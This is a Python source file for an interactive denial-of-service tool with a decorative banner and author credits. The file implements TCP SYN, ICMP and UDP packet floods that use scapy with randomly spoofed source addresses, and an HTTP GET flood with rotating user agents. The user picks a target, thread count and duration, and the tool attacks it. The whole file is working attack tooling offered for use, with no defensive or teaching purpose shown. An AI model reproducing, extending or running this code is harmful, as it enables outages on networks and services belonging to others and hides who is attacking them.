from logging import Formatter, StreamHandler, INFO, WARNING, ERROR, CRITICAL, basicConfig, addLevelName, getLogger
from scapy.all import send, IP, TCP, UDP, ICMP, Raw, logging as scapy_logging
from aiohttp import TCPConnector, ClientTimeout, ClientSession, ClientError
from asyncio import gather, run, TimeoutError
from socket import gethostbyname, gaierror
from threading import Thread, Event, Lock
from os import system, urandom, name
from fake_useragent import UserAgent
from urllib.parse import urlparse
from sys import exit as _exit
from time import sleep, time
from random import randint

import platform
import os

# Get current platform
platform_name = platform.system().lower()

# Check if running in WSL
if "linux" in platform_name and "microsoft" in platform.uname().release.lower():
    # WSL environment, treat as Linux
    if os.geteuid() != 0:
        _exit("This script must be run with root privileges!")
else:
    # Standard Unix-like systems or Windows
    if not (platform_name == 'nt' and __import__('ctypes').windll.shell32.IsUserAnAdmin() != 0) and os.geteuid() != 0:
        _exit("This script must be run with root privileges!")

# Suppress scapy warnings
scapy_logging.getLogger("scapy.runtime").setLevel(scapy_logging.ERROR)

# Add the new logging level to the logging module
SUCCESS = INFO + 5
addLevelName(SUCCESS, "SUCCESS")

# Configure logging
basicConfig(level = INFO, format = '%(message)s')
logger = getLogger()

class CustomFormatter(Formatter):
    FORMATS = {
        INFO: "\033[1;91m[\033[0m\033[1;96m%(asctime)s \033[0m\033[1;91m- \033[0m\033[1;96m%(levelname)s\033[0m\033[1;91m]\033[0m %(message)s\033[0m",
        WARNING: "\n\033[1;91m[\033[0m\033[1;93m%(asctime)s \033[0m\033[1;91m- \033[0m\033[1;93m%(levelname)s\033[0m\033[1;91m]\033[0m %(message)s\033[0m\n",
        ERROR: "\033[1;91m[%(asctime)s - %(levelname)s] %(message)s\033[0m",
        CRITICAL: "\033[1;91m[%(asctime)s - %(levelname)s] %(message)s\033[0m",
        SUCCESS: "\033[1;91m[\033[0m\033[1;92m%(asctime)s \033[0m\033[1;91m- \033[0m\033[1;92m%(levelname)s\033[0m\033[1;91m]\033[0m %(message)s\033[0m"
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = Formatter(log_fmt, datefmt = "%H:%M:%S")
        return formatter.format(record)

handler = StreamHandler()
handler.setFormatter(CustomFormatter())
logger.handlers = [handler]

# Global variables
total_sent = 0
source_ips = set()
port_lock = Lock()
stop_event = Event()
user_agent = UserAgent()

def display_banner():
    system('cls' if name == 'nt' else 'clear')
    DEFAULT, GREEN, RED, YELLOW, YELLOW2, BLINK, MAGENTA = '\033[0m', '\033[1;92m', '\033[1;31m', '\033[3m\033[1;33m', '\033[1;93m', '\033[5m', '\033[1;35m'

    print('''
{4} ██████   █████           █████        █████████   █████               ███  █████{0}
{4}░░██████ ░░███           ░░███        ███░░░░░███ ░░███               ░░░  ░░███{0}
{4}░███░███ ░███   ██████  ███████     ░███    ░░░  ███████   ████████  ████  ░███ █████  ██████{0}
{4}░███░░███░███  ███░░███░░░███░      ░░█████████ ░░░███░   ░░███░░███░░███  ░███░░███  ███░░███{0}
{4}░███ ░░██████ ░███████   ░███        ░░░░░░░░███  ░███     ░███ ░░░  ░███  ░██████░  ░███████{0}
{4}░███  ░░█████ ░███░░░    ░███ ███    ███    ░███  ░███ ███ ░███      ░███  ░███░░███ ░███░░░{0}
{4}█████  ░░█████░░██████   ░░█████    ░░█████████   ░░█████  █████     █████ ████ █████░░██████{0}
{4}░░░░░    ░░░░░  ░░░░░░     ░░░░░      ░░░░░░░░░     ░░░░░  ░░░░░     ░░░░░ ░░░░ ░░░░░  ░░░░░░{0}


         {6})    /\__/\ 
         {6}( = (˶ᵔ ᵕ ᵔ˶)
         {1}-------{6}U{1}-{6}U{1}----------------
         {1}|                        |       |‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|
         {1}|  {3}Code Author: {2}isPique  {0}{1}|             {3}GitHub: {2}https://github.com/isPique{0}
         {1}|      {3}Version: {2}1.0      {0}{1}|           {3}Insta: {2}https://instagram.com/omrefarukk{0}
         {1}|                        |       |_____________________________________________|
         {1}--------------------------                        {6}\ (˶ᵔ ᵕ ᵔ˶) /{0}
                                                            {6}\         /{0}
          '''.format(DEFAULT, GREEN, RED, YELLOW, YELLOW2, BLINK, MAGENTA))

def tcp_syn_flood(destination_ip, packet_size, thread_num):
    global total_sent
    port = 1
    while not stop_event.is_set():
        with port_lock:
            port = (port + 1) % 65535 or 1
        payload = urandom(packet_size)
        source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))  # IP Spoofing
        packet = IP(src = source_ip, dst = destination_ip) / TCP(dport = port, flags = 'S') / Raw(load = payload) # SYN flag
        send(packet, verbose = False)  # Response: SYN/ACK
        total_sent += packet_size
        source_ips.add(source_ip)
        logger.info(f"\033[1;35m[THREAD {thread_num}] \033[1;91m\xBB \033[1;93m{packet_size}\033[1;92m bytes sent to \033[1;93m{destination_ip}\033[1;92m through port \033[1;93m{port} \033[1;92mfrom \033[1;93m{source_ip}")

def icmp_flood(destination_ip, packet_size, thread_num):
    global total_sent
    while not stop_event.is_set():
        payload = urandom(packet_size)
        source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
        packet = IP(src = source_ip, dst = destination_ip) / ICMP() / Raw(load = payload)
        send(packet, verbose = False)
        total_sent += packet_size
        source_ips.add(source_ip)
        logger.info(f"\033[1;35m[THREAD {thread_num}] \033[1;91m\xBB \033[1;93m{packet_size}\033[1;92m bytes sent to \033[1;93m{destination_ip}\033[1;92m from \033[1;93m{source_ip}")

def udp_flood(destination_ip, packet_size, thread_num):
    global total_sent
    port = 1
    while not stop_event.is_set():
        with port_lock:
            port = (port + 1) % 65535 or 1
        payload = urandom(packet_size)
        source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
        packet = IP(src = source_ip, dst = destination_ip) / UDP(dport = port) / Raw(load = payload)
        send(packet, verbose = False)
        total_sent += packet_size
        source_ips.add(source_ip)
        logger.info(f"\033[1;35m[THREAD {thread_num}] \033[1;91m\xBB \033[1;93m{packet_size}\033[1;92m bytes sent to \033[1;93m{destination_ip}\033[1;92m through port \033[1;93m{port} \033[1;92mfrom \033[1;93m{source_ip}")

async def send_request(session, url):
    global total_sent
    try:
        headers = {
            "User-Agent": user_agent.random,
            "Connection": "keep-alive",
            "Accept": "*/*"
        }
        async with session.get(url, headers = headers, ssl = False) as response:  # Disable SSL verification
            total_sent += 1
            status_color = '\033[1;92m' if 200 <= response.status < 300 else '\033[1;93m' if 300 <= response.status < 400 else '\033[1;91m'
            return logger.info(f"\033[1;93mHTTP GET\033[1;92m request sent to \033[1;93m{url} \033[1;91m\xBB \033[1;94m[ {status_color}{response.status} {response.reason}\033[1;94m ]")
    except TimeoutError:
        return logger.error("Request timed out. Retrying...")
    except ClientError as e:
        return logger.error(f"Client Error: {e}")

async def http_flood(url, num_requests):
    connector = TCPConnector()
    timeout = ClientTimeout(total = 10)
    async with ClientSession(connector = connector, timeout = timeout) as session:
        tasks = [send_request(session, url) for _ in range(num_requests)]
        responses = await gather(*tasks)
        (response for response in responses)

def stop_attack(threads):
    stop_event.set()
    logger.warning("\033[1;93mWaiting for all threads to shut down...")
    for thread in threads:
        thread.join()
    print()
    logger.log(SUCCESS, f"\033[1;92mAttack completed. A total of \033[1;93m{convert_bytes(total_sent)}\033[1;92m data was sent across \033[1;93m{len(source_ips)}\033[1;92m unique IPs within \033[1;93m{duration}\033[1;92m seconds.\033[0m")

def validate_attack_type(choice):
    return choice if choice in ['1', '2', '3', '4', '5'] else logger.error("Please select one of the attack types above. (1, 2, 3...)") or _exit(1)

def validate_ip(ip):
    try:
        return gethostbyname(ip)
    except gaierror:
        logger.error("Invalid IP address or hostname.") or _exit(1)

def validate_url(url):
    parsed_url = urlparse(url)
    if parsed_url.scheme and parsed_url.netloc:
        domain = parsed_url.netloc
        try:
            gethostbyname(domain)
            return url
        except gaierror:
            logger.error(f"Domain '{domain}' doesn't exist.") or _exit(1)
    else:
       logger.error("Invalid URL format.") or _exit(1)

def validate_num_requests(num):
    return int(num) if num.isdigit() and int(num) > 0 else logger.error("Please enter a positive integer for the number of requests.") or _exit(1)

def validate_packet_size(size):
    return int(size) if size.isdigit() and 1 <= int(size) <= 65495 else logger.error("Please choose a size between 1 and 65495") or _exit(1)

def validate_thread_count(count):
    return int(count) if count.isdigit() and int(count) > 0 else logger.error("Please enter a positive integer for the thread count.") or _exit(1)

def validate_duration(duration):
    return int(duration) if duration.isdigit() and int(duration) > 0 else logger.error("Duration must be a positive integer.") or _exit(1)

def convert_bytes(num):
    for unit in ["Bytes", "KB", "MB", "GB", "TB"]:
        if num < 1024:
            return f"{num:.2f} {unit}"
        num /= 1024

def main():
    global total_sent
    global duration
    attack_types = {
        '1': {'func': tcp_syn_flood, 'proto': 'TCP SYN'},
        '2': {'func': icmp_flood, 'proto': 'ICMP'},
        '3': {'func': udp_flood, 'proto': 'UDP'},
        '4': {'func': http_flood, 'proto': 'HTTP'}
    }

    try:
        display_banner()

        print("\033[1;93m----- Attack Types -----   \033[1;35m⊂ (˶ᵔ ᵕ ᵔ˶ ⊂ )\n")
        print("   \033[1;34m1. \033[2;32mTCP SYN Flood")
        print("   \033[1;34m2. \033[2;32mICMP Flood")
        print("   \033[1;34m3. \033[2;32mUDP Flood")
        print("   \033[1;34m4. \033[2;32mHTTP Flood")
        print("   \033[1;34m5. \033[2;32mExit")

        attack_type = validate_attack_type(input("\n\033[1;34m[>] \033[2;32mSelect Attack Type \xBB\033[0m\033[1;77m ").strip())
        if attack_type == '4':
            target_url = validate_url(input("\033[1;34m[>] \033[2;32mEnter the target URL \xBB\033[0m\033[1;77m ").strip())
            num_requests = validate_num_requests(input("\033[1;34m[>] \033[2;32mEnter how many requests do you want to send in each cycle \xBB\033[0m\033[1;77m ").strip())

        elif attack_type == '5':
            logger.info("\033[1;96mExiting...")
            _exit(0)
        else:
            target_ip = validate_ip(input("\033[1;34m[>] \033[2;32mEnter the target IP or hostname \xBB\033[0m\033[1;77m ").strip())
            packet_size = validate_packet_size(input("\033[1;34m[>] \033[2;32mEnter the packet size \xBB\033[0m\033[1;77m ").strip())
            thread_count = validate_thread_count(input("\033[1;34m[>] \033[2;32mEnter how many threads to use \xBB\033[0m\033[1;77m ").strip())

        duration = validate_duration(input("\033[1;34m[>] \033[2;32mEnter how long (in seconds) to run the attack \xBB\033[0m\033[1;77m ").strip())

        attack_details = attack_types[attack_type]
        attack_name = attack_details['proto']
        attack_func = attack_details['func']
        target = target_url if attack_type == '4' else target_ip

        print()
        sleep(1)
        logger.critical(f"Launching the {attack_name} Flood attack on {target} {f'using {thread_count} threads and it will last ' if attack_type != '4' else ''}for {duration} seconds with {f'{packet_size} bytes per packet...' if attack_type != '4' else f'{num_requests} requests for each cycle...'}")
        sleep(1)
        logger.critical("Press Ctrl + C for immediate stop.\n")
        sleep(1)

    except KeyboardInterrupt:
        print()
        logger.info("\033[1;96mTermination signal received. Exiting...\033[0m")
        _exit(0)

    if attack_type != '4':
        threads = []
        for i in range(thread_count):
            thread = Thread(target = attack_func, args = (target_ip, packet_size, i + 1))
            threads.append(thread)
            thread.start()

        try:
            sleep(duration)
            stop_attack(threads)
        except KeyboardInterrupt:
            stop_attack(threads)

    else:
        total_time = time()
        while time() - total_time < duration:
            try:
                start_time = time()
                run(attack_func(target_url, num_requests))
                elapsed_time = time() - start_time
                print()
                logger.log(SUCCESS, f"\033[1;92mSent \033[1;93m{num_requests}\033[1;92m requests in the last \033[1;93m{elapsed_time:.2f}\033[1;92m seconds.")
            except KeyboardInterrupt:
                print()
                logger.info("\033[1;96mTermination signal received. Stopping attack...\033[0m")
                logger.log(SUCCESS, f"\033[1;92mAttack stopped. A total of \033[1;93m{total_sent}\033[1;92m requests sent within \033[1;93m{time() - total_time:.2f}\033[1;92m seconds.") or _exit(1)

        logger.log(SUCCESS, f"\033[1;92mAttack completed. A total of \033[1;93m{total_sent}\033[1;92m requests sent within \033[1;93m{time() - total_time:.2f}\033[1;92m seconds. (\033[1;93m+{(time() - total_time) - duration:.2f}\033[1;92m due to asynchronous latency)")

if __name__ == "__main__":
    main()
